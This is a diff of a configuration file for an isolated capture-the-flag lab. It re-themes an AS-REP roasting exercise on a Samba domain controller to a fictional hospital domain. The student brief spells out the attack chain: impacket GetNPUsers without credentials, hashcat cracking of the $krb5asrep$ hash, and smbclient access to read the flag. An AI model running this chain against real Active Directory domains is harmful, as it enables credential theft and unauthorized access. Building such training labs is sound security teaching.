@@ -1,24 +1,25 @@
 # yaml-language-server: $schema=https://www.isoloom.com/schema/v1.json
-# AS-REP roasting (GOAD-themed) as a single-container Isoloom lab: one Samba Active Directory
-# Domain Controller for NORTH.SEVENKINGDOMS.LOCAL, no Windows VMs. It provisions a set of
-# ordinary domain users plus one account whose Kerberos pre-authentication is disabled
-# (jon.snow, UF_DONT_REQUIRE_PREAUTH, weak RC4 key) and a vault share only that account may
-# read. With nothing but a username list, the student AS-REP roasts jon.snow, cracks the
-# $krb5asrep$ hash offline, and reads the flag. `isoloom generate`, then `isothrum up . --target docker`.
+# AS-REP roasting as a single-container Isoloom lab: one Samba Active Directory Domain
+# Controller for LAKESIDE.LAB (Lakeside Regional Hospital, a healthcare provider), no Windows
+# VMs. It provisions a set of ordinary hospital staff users plus one legacy service account
+# whose Kerberos pre-authentication is disabled (svc-scanner, UF_DONT_REQUIRE_PREAUTH, weak RC4
+# key) and an imaging share only that account may read. With nothing but a username list, the
+# student AS-REP roasts svc-scanner, cracks the $krb5asrep$ hash offline, and reads the flag.
+# `isoloom generate`, then `isothrum up . --target docker`.
 version: 1
 
-name: asrep-roast-north
+name: asrep-roast-lakeside
 
 # Given by the CyberCTF launcher: this player's flag. Without it the development flag.
 inputs: [CTF_FLAG_MAIN]
 
 networks:
-  lab: { cidr: 10.61.13.0/24, internet: false }
+  lab: { cidr: 10.30.10.0/24, internet: false }
 
 machines:
   dc:
     networks: { lab: 10 }
-    aliases: [dc.north.sevenkingdoms.local, north.sevenkingdoms.local]
+    aliases: [dc.lakeside.lab, lakeside.lab]
     resources: { cpus: 4, memory_mb: 3072 }
     ports:
       dns:         { port: 53,   protocol: tcp }
@@ -32,7 +33,7 @@ machines:
       ldaps:       { port: 636,  protocol: tls }
       gc:          { port: 3268, protocol: tcp }
     # The flag arrives as a file before the DC starts (Isoloom's sensitive-input mechanism);
-    # provisioning copies it into the vault that only jon.snow may read.
+    # provisioning copies it into the imaging share that only svc-scanner may read.
     files:
       - { path: /ctf/flag, input: CTF_FLAG_MAIN, mode: "0444" }
     app:
@@ -43,35 +44,37 @@ checks:
   - { name: LDAP answers, tcp: dc:389, wait: 120 }
   - { name: SMB answers, tcp: dc:445, wait: 120 }
   # End-to-end AS-REP roast, driven from inside the DC: a pre-auth-less AS-REQ against the
-  # username list yields jon.snow's $krb5asrep$ hash, cracked (hashcat 18200) to the weak
+  # username list yields svc-scanner's $krb5asrep$ hash, cracked (hashcat 18200) to the weak
   # password, and that password reads the flag. Passes only when the DC is genuinely roastable;
   # the heavy step is gated behind the ports.
-  - name: AS-REP roasting jon.snow recovers the password and unlocks the flag
+  - name: AS-REP roasting svc-scanner recovers the password and unlocks the flag
     from: dc
     exec: /opt/asrep/check.sh
     expect: ASREP_OK
     wait: 180
 
 message: |
-  # AS-REP Roasting — NORTH.SEVENKINGDOMS.LOCAL
+  # AS-REP Roasting — Lakeside Regional Hospital (LAKESIDE.LAB)
 
-  A lone Active Directory Domain Controller (Samba) runs the realm **NORTH.SEVENKINGDOMS.LOCAL**:
+  **Lakeside Regional Hospital** runs its network on a single Active Directory Domain
+  Controller (Samba) for the realm **LAKESIDE.LAB**:
 
-  - **DC:** `dc.north.sevenkingdoms.local` at `{{ machines.dc.addresses.lab }}` (KDC 88, LDAP 389, SMB 445).
+  - **DC:** `dc.lakeside.lab` at `{{ machines.dc.addresses.lab }}` (KDC 88, LDAP 389, SMB 445).
   - You have only a list of likely usernames (no credentials).
 
-  **Objective:** one account has **Kerberos pre-authentication disabled** (`userAccountControl`
-  bit `DONT_REQ_PREAUTH`). The AS-REP for such an account — the KDC reply encrypted with the
-  account's own key — is the crackable material of an AS-REP roast. Recover that account's
-  password and use it to read the flag from a share you cannot otherwise open.
+  **Objective:** a legacy document-scanner service account has **Kerberos pre-authentication
+  disabled** (`userAccountControl` bit `DONT_REQ_PREAUTH`). The AS-REP for such an account — the
+  KDC reply encrypted with the account's own key — is the crackable material of an AS-REP roast.
+  Recover that account's password and use it to read the flag from a share you cannot otherwise
+  open.
 
   Point your attack box's resolver and `/etc/krb5.conf` at the DC, then:
 
   1. **AS-REP roast the username list (impacket, the real-world technique):**
-     `GetNPUsers.py NORTH.SEVENKINGDOMS.LOCAL/ -usersfile users.txt -no-pass -dc-ip {{ machines.dc.addresses.lab }} -format hashcat`
-     → against a Windows AD DC this returns a `$krb5asrep$23$jon.snow@...` hash.
-  2. **Crack it:** `hashcat -m 18200 asrep.hash rockyou.txt` (the password is a weak season+year word).
-  3. **Loot the flag:** `smbclient //dc/vault -U 'NORTH\jon.snow%<cracked>' -c 'get flag.txt'`.
+     `GetNPUsers.py LAKESIDE.LAB/ -usersfile users.txt -no-pass -dc-ip {{ machines.dc.addresses.lab }} -format hashcat`
+     → against a Windows AD DC this returns a `$krb5asrep$23$svc-scanner@...` hash.
+  2. **Crack it:** `hashcat -m 18200 asrep.hash rockyou.txt` (the password is a weak word built from the scanner service's name and a year).
+  3. **Loot the flag:** `smbclient //dc/imaging -U 'LAKESIDE\svc-scanner%<cracked>' -c 'get flag.txt'`.
 
   > **Samba caveat.** This DC is **Samba**, whose KDC demands pre-authentication for *every*
   > account — even one flagged `DONT_REQ_PREAUTH` — so `GetNPUsers -no-pass` here returns
